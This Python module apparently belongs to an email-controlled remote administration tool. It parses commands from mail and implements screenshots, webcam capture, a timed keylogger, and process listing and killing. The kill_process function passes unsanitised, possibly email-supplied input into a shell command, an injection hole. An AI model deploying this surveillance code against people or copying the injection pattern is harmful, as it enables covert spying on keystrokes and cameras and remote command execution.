from constant import *


def decode_mail(msg: str):
    cmd_list = ""

    print("\r-----------------------------")
    sender = email.utils.parseaddr(msg.get("From"))[1]
    print("From:", sender)
    print("Content:", end=" ")
    for part in msg.walk():
        if part.get_content_type() == "text/plain":
            content = part.get_payload(decode=True).decode("utf-8")
            print(content, end="\t")
            cmd_list += content

    cmd_list = cmd_list.replace("\n", " ").replace("\r", " ").split()
    # print()
    # print(cmd_list)
    return sender, cmd_list


def current_time() -> str:
    return datetime.now().strftime("%H:%M:%S %d-%m-%Y")


def check_ext(file_name) -> str:
    ext = [".png", ".jpg", ".jpeg", ".tiff", ".bmp", ".gif"]
    if not any(file_name.endswith(x) for x in ext):
        file_name += ".png"
    return file_name


def capture_SS(file_name: str = "Picture.png") -> str:
    check_ext(file_name)
    path = "Files\\Pictures\\"

    pyautogui.screenshot(path + file_name)
    return path + file_name


def capture_webcam(file_name: str = "Webcam.png"):
    check_ext(file_name)
    cap = cv2.VideoCapture(0)
    
    message:str = ""
    path = "Files\\Pictures\\"

    if not cap.isOpened():
        message = "ERROR: Cannot open camera"
        exit()

    success, frame = cap.read()

    cv2.imwrite(path + file_name, frame)
    cap.release()
    if not success:
        message = "ERROR: Cannot capture frame"
        
    return path + file_name, message


def logger(duration: int) -> str:
    file_path: str = "Files\\Keylog.txt"
    # ? Ensure the existence of the file
    with open(file_path, "w") as f:
        pass

    logging.basicConfig(
        filename=file_path,
        filemode="w",
        level=logging.DEBUG,
        format="%(asctime)s - %(message)s",
        datefmt="%d-%b-%y %H:%M:%S",
    )

    def on_press(key):
        try:
            logging.info(str(key))
        except AttributeError:
            logging.error(str(key))

    with Listener(on_press=on_press) as listener:
        sleep(duration)
        listener.stop()

    return file_path


def note2log(sender: str, cmd_list: list) -> str:
    file_path: str = "Files\\mail.log"

    with open(file_path, "a") as log:
        pass

    logging.basicConfig(
        filename=file_path,
        filemode="a",
        level=logging.INFO,
        format="%(asctime)s - %(message)s",
        datefmt="%d-%b-%y %H:%M:%S",
    )

    logging.info(f"From: {sender}, Command: {cmd_list}")

    return file_path


def list_command() -> str:
    content = "The supported commands:"
    content += "\n\t- screenshot [file_name]"
    content += "\n\t- webcam                        (not available)"
    content += "\n\t- keylog [time in seconds]"
    content += "\n\t- logout"
    content += "\n\t- shutdown [time in seconds]"
    content += "\n\t- listApp"
    content += "\n\t- listProcess"
    content += "\n\t- terminateProcess [PID/Process Name]"
    content += "\n\t- dir                            (not available)"
    content += "\n\t- log"
    content += "\n\t- help"
    return content


def list_running_application():
    file_path = "Files\\Applications.txt"

    powershell_script = """
    Get-Process | Where-Object {$_.MainWindowHandle -ne 0} | Select-Object Name, MainWindowTitle
    """

    try:
        # Run PowerShell script
        result = subprocess.run(
            ["powershell", "-Command", powershell_script],
            capture_output=True,
            text=True,
            check=True,
        )

        # Print the result
        with open(file_path, "w") as f:
            f.write(result.stdout)

    except subprocess.CalledProcessError as e:
        pass
    return file_path


def list_running_process():
    file_path: str = "Files\\Processes.txt"

    command = "tasklist"
    result = os.popen(command).read()

    def take_2(data):
        lines = data.split("\n")
        index = lines[1].find("Session Name")
        lst = [i[:index] for i in lines]
        data = "\n".join(lst)
        return data

    with open(file_path, "w") as file:
        file.write(take_2(result))

    return file_path


def kill_process(data):
    command: str = ""
    data = str(data)
    if data.isdigit():
        command = "taskkill /PID " + data + " /F"
    else:
        command = "taskkill /IM " + data + " /F"

    result = os.popen(command).read()
    return result
